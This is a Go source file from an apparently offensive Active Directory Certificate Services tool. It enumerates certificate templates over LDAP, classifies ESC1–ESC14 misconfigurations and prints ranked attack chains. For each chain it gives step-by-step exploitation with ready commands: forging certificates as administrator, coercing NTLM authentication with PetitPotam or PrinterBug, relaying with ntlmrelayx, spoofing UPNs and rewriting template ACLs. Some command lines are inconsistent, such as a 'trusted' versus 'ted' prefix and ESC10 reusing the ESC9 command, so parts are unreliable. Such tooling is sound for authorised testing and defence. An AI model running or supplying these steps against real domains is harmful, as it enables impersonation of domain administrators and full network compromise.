package pki

import (
	"context"
	"fmt"
	"github.com/go-ldap/ldap/v3"
	"strings"
)

// AttackPath represents a prioritized ADCS attack chain.
type AttackPath struct {
	Priority    int          `json:"priority"`
	ESCType     string       `json:"esc_type"`
	Template    CertTemplate `json:"template"`
	Description string       `json:"description"`
	Impact      string       `json:"impact"`
	Difficulty  string       `json:"difficulty"`
	Steps       []string     `json:"steps"`
}

// ESCDescription maps ESC types to human-readable descriptions.
var ESCDescription = map[string]struct {
	Name       string
	Impact     string
	Difficulty string
}{
	"ESC1":       {"Misconfigured Certificate Templates", "Domain Admin impersonation via forged certificate", "Low"},
	"ESC2":       {"Misconfigured Certificate Templates (Any Purpose)", "Privilege escalation via any-purpose certificate", "Low"},
	"ESC3":       {"Enrollment Agent Templates", "Enroll on behalf of other users", "Medium"},
	"ESC4":       {"Vulnerable Certificate Template ACLs", "Modify template to enable ESC1, then exploit", "Medium"},
	"ESC4-CHECK": {"Template ACL Review Needed", "Potential WriteDacl/WriteOwner on template", "Unknown"},
	"ESC5":       {"Vulnerable PKI Object ACLs", "Modify CA or enrollment service configuration", "High"},
	"ESC6":       {"EDITF_ATTRIBUTESUBJECTALTNAME2", "CA allows arbitrary SAN in requests", "Low"},
	"ESC7":       {"Vulnerable CA ACLs", "ManageCA/ManageCertificates on CA server", "Medium"},
	"ESC8":       {"NTLM Relay to AD CS HTTP Endpoints", "Relay NTLM auth to web enrollment for certificate issuance", "Medium"},
	"ESC9":       {"CT_FLAG_NO_SECURITY_EXTENSION (No Security Extension)", "UPN spoofing via certificate without requester SID", "Medium"},
	"ESC10":      {"Weak Certificate Mapping (CertificateMappingMethods)", "Impersonation via weak UPN or S4U2Self certificate mapping", "Medium"},
	"ESC11":      {"NTLM Relay to AD CS RPC Interface", "Relay NTLM auth to ICertPassage RPC for certificate issuance", "Medium"},
	"ESC12":      {"DCOM interface abuse on CA with network HSM key storage", "Remote certificate enrollment via ICertRequest DCOM interface", "Medium"},
	"ESC13":      {"OID group link — issuance policy linked to security group via msDS-OIDToGroupLink", "Privilege escalation via OID-to-group membership mapping", "Low"},
	"ESC14":      {"Weak Explicit Mappings via altSecurityIdentities", "Impersonation via schema v1 templates with weak binding enforcement", "Medium"},
}

// BuildAttackChain analyzes enumerated templates and generates prioritized attack paths.
func BuildAttackChain(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]AttackPath, error) {
	fmt.Println("[*] Building ADCS attack chain...")
	fmt.Printf("[*] Target: %s\\%s\n", cfg.Domain, cfg.TargetDC)

	templates, err := EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("enumerate: %w", err)
	}

	var paths []AttackPath
	priority := 1

	for _, tmpl := range templates {
		for _, vuln := range tmpl.ESCVulns {
			desc, ok := ESCDescription[vuln]
			if !ok {
				continue
			}

			path := AttackPath{
				Priority:    priority,
				ESCType:     vuln,
				Template:    tmpl,
				Description: desc.Name,
				Impact:      desc.Impact,
				Difficulty:  desc.Difficulty,
				Steps:       buildSteps(vuln, tmpl, cfg),
			}
			paths = append(paths, path)
			priority++
		}
	}

	// Sort by ESC score (higher = more exploitable = higher priority)
	for i := 0; i < len(paths)-1; i++ {
		for j := i + 1; j < len(paths); j++ {
			if paths[j].Template.ESCScore > paths[i].Template.ESCScore {
				paths[i], paths[j] = paths[j], paths[i]
			}
		}
	}

	// Re-assign priority numbers after sorting
	for i := range paths {
		paths[i].Priority = i + 1
	}

	return paths, nil
}

func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
	switch escType {
	case "ESC1":
		return []string{
			fmt.Sprintf("Identify template: %s (enrollee supplies subject + auth EKU)", tmpl.Name),
			"Request certificate with arbitrary SAN (e.g., administrator@" + cfg.Domain + ")",
			"Use forged certificate for Kerberos PKINIT or Schannel authentication",
			fmt.Sprintf("Command: trusted esc 1 -t %s -U administrator@%s -d %s -dc %s",
				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
		}
	case "ESC2":
		return []string{
			fmt.Sprintf("Identify template: %s (Any Purpose EKU + enrollee supplies subject)", tmpl.Name),
			"Request certificate with Any Purpose EKU — can be used as client auth",
			"Authenticate as any user specified in the SAN",
			fmt.Sprintf("Command: trusted esc 2 -t %s -U administrator@%s -d %s -dc %s",
				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
		}
	case "ESC3":
		return []string{
			fmt.Sprintf("Identify template: %s (Certificate Request Agent EKU)", tmpl.Name),
			"Stage 1: Enroll for enrollment agent certificate",
			"Stage 2: Use agent certificate to enroll on behalf of target user",
			fmt.Sprintf("Command: ted esc 3 -t %s -U administrator@%s -d %s -dc %s",
				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
		}
	case "ESC13":
		return []string{
			fmt.Sprintf("Identify template: %s (issuance policy OID linked to security group)", tmpl.Name),
			"Enroll in the template — the issued certificate contains the linked issuance policy OID",
			"Authenticate via Kerberos PKINIT — the OID maps to group membership in the TGT",
			fmt.Sprintf("Command: ted esc 13 -t %s -U %s@%s -d %s -dc %s",
				tmpl.Name, cfg.Username, cfg.Domain, cfg.Domain, cfg.TargetDC),
		}
	case "ESC9":
		return []string{
			fmt.Sprintf("Identify template: %s (CT_FLAG_NO_SECURITY_EXTENSION + auth EKU)", tmpl.Name),
			"Modify attacker's userPrincipalName to target UPN",
			"Request certificate from vulnerable template — cert lacks requester SID extension",
			"Restore attacker's original UPN",
			"Authenticate with issued certificate — DC maps cert to target UPN (no SID check)",
			fmt.Sprintf("Command: ted esc 9 -t %s -U administrator@%s --adn CN=%s,... -d %s -dc %s",
				tmpl.Name, cfg.Domain, cfg.Username, cfg.Domain, cfg.TargetDC),
		}
	case "ESC4", "ESC4-CHECK":
		return []string{
			fmt.Sprintf("Identify template: %s (WriteDacl/WriteOwner ACL)", tmpl.Name),
			"Modify template msPKI-Certificate-Name-Flag to enable ENROLLEE_SUPPLIES_SUBJECT",
			"Exploit modified template as ESC1",
			"Restore original template configuration",
			fmt.Sprintf("Command: ted esc 4 -t %s -U administrator@%s -d %s -dc %s",
				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
		}
	case "ESC6":
		return []string{
			fmt.Sprintf("Identify template: %s (CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled)", tmpl.Name),
			"Request certificate from any template with arbitrary SAN in request attributes",
			"CA processes the SAN attribute regardless of template configuration",
			"Authenticate with forged certificate as target user",
			fmt.Sprintf("Command: ted esc 6 -t %s -U administrator@%s -d %s -dc %s",
				tmpl.Name, cfg.Domain, cfg.Domain, cfg.TargetDC),
		}
	case "ESC7":
		return []string{
			"Identify CA where attacker has ManageCA rights",
			"Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA",
			"Exploit as ESC6 — request cert with arbitrary SAN",
			"Restore original CA configuration",
			fmt.Sprintf("Command: ted esc 7 -c <CA_NAME> -U administrator@%s -d %s -dc %s",
				cfg.Domain, cfg.Domain, cfg.TargetDC),
		}
	case "ESC8":
		return []string{
			"Identify CA with HTTP web enrollment endpoint (/certsrv/) accepting NTLM",
			"Coerce NTLM authentication from a privileged account (e.g., PetitPotam, PrinterBug)",
			"Relay coerced NTLM auth to the CA's /certsrv/ endpoint via ntlmrelayx",
			"Obtain certificate as the relayed principal",
			fmt.Sprintf("Command: ntlmrelayx.py -t http://<CA_HOSTNAME>/certsrv/certfnsh.asp -smb2support --adcs --template %s", tmpl.Name),
		}
	case "ESC10":
		return []string{
			fmt.Sprintf("Identify template: %s (authentication EKU + weak certificate mapping)", tmpl.Name),
			"Confirm CertificateMappingMethods includes UPN (0x04) or S4U2Self (0x08)",
			"Confirm StrongCertificateBindingEnforcement < 2",
			"Obtain a certificate with authentication EKU from the template",
			"Authenticate using the certificate — DC maps via weak UPN/S4U2Self method",
			fmt.Sprintf("Command: ted esc 9 -t %s -U administrator@%s --adn CN=%s,... -d %s -dc %s",
				tmpl.Name, cfg.Domain, cfg.Username, cfg.Domain, cfg.TargetDC),
		}
	case "ESC11":
		return []string{
			"Identify CA with IF_ENFORCEENCRYPTICERTREQUEST flag NOT set",
			"Coerce NTLM authentication from a privileged account (e.g., PetitPotam, PrinterBug)",
			"Relay coerced NTLM auth to the CA's RPC interface (ICertPassage/MS-ICPR)",
			"Obtain certificate as the relayed principal",
			"Command: ted esc 11 -t <TEMPLATE> -U <UPN> -l <IP> -d <DOM> -dc <DC>",
		}
	case "ESC12":
		return []string{
			"Identify CA with DCOM endpoint mapper (port 135) remotely accessible",
			"Confirm CA private key is stored on a network HSM or DCOM enrollment is unrestricted",
			"Relay coerced NTLM auth to ICertRequest DCOM interface on the CA server",
			"Request certificate via DCOM — bypasses web enrollment and RPC restrictions",
			"Command: ted esc 12 -t <TEMPLATE> -U <UPN> -l <IP> -d <DOM> -dc <DC>",
		}
	case "ESC14":
		return []string{
			fmt.Sprintf("Identify template: %s (schema v%d + authentication EKU + weak binding)", tmpl.Name, tmpl.SchemaVersion),
			"Confirm StrongCertificateBindingEnforcement < 2 and CertificateMappingMethods includes UPN (0x04)",
			"Enroll for a certificate from the schema v1 template",
			"Set altSecurityIdentities on target user to map the issued certificate",
			"Authenticate using the certificate — DC accepts explicit mapping without strong binding",
		}
	default:
		return []string{
			fmt.Sprintf("Review template: %s for %s vulnerability", tmpl.Name, escType),
			"Manual exploitation required — see documentation",
		}
	}
}

// PrintAttackChain prints a formatted attack chain report.
func PrintAttackChain(paths []AttackPath) {
	if len(paths) == 0 {
		fmt.Println("[*] No exploitable attack paths found.")
		return
	}

	fmt.Printf("\n╔══════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║           ADCS ATTACK CHAIN — %d PATH(S) DETECTED           ║\n", len(paths))
	fmt.Printf("╚══════════════════════════════════════════════════════════════╝\n\n")

	for _, path := range paths {
		fmt.Printf("━━━ [%d] %s on %q ━━━\n", path.Priority, path.ESCType, path.Template.Name)
		fmt.Printf("    Description: %s\n", path.Description)
		fmt.Printf("    Impact:      %s\n", path.Impact)
		fmt.Printf("    Difficulty:  %s\n", path.Difficulty)
		fmt.Printf("    Score:       %d\n", path.Template.ESCScore)
		fmt.Printf("    Vulns:       %s\n", strings.Join(path.Template.ESCVulns, ", "))
		fmt.Printf("    Steps:\n")
		for i, step := range path.Steps {
			fmt.Printf("      %d. %s\n", i+1, step)
		}
		fmt.Println()
	}
}
